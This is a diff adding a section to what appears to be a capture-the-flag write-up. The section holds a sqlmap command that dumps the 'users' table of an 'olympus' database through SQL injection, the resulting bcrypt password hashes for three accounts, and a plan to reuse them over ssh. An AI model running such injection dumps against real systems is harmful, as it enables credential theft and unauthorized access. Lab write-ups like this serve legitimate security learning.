@@ -212,5 +212,25 @@ Table: users
 
 ...
 ```
+
+Now, It's time to extract the username and passwor
+```
+sqlmap -r request.txt -D olympus -T users -C user_name,user_password --dump
+...
+Database: olympus
+Table: users
+[3 entries]
++--------------------------------------------------------------+------------+
+| user_password                                                | user_name  |
++--------------------------------------------------------------+------------+
+| $2y$10$YC6uoMwK9VpB5QL513vfLu1RV2sgBf01c0lzPHcz1qK2EArDvnj3C | prometheus |
+| $2y$10$lcs4XWc5yjVNsMb4CUBGJevEkIuWdZN3rsuKWHCc.FGtapBAfW.mK | root       |
+| $2y$10$cpJKDXh2wlAI5KlCsUaLCOnf0g5fiG0QSUS53zp/r0HMtaj6rT4lC | zeus       |
++--------------------------------------------------------------+------------+
+...
+
+```
+Maybe, with these credentials, I can connect to the server via `ssh`
+
 # Reference
 [SQLmap](https://www.vaadata.com/blog/sqlmap-the-tool-for-detecting-and-exploiting-sql-injections/#listing-the-table-names)
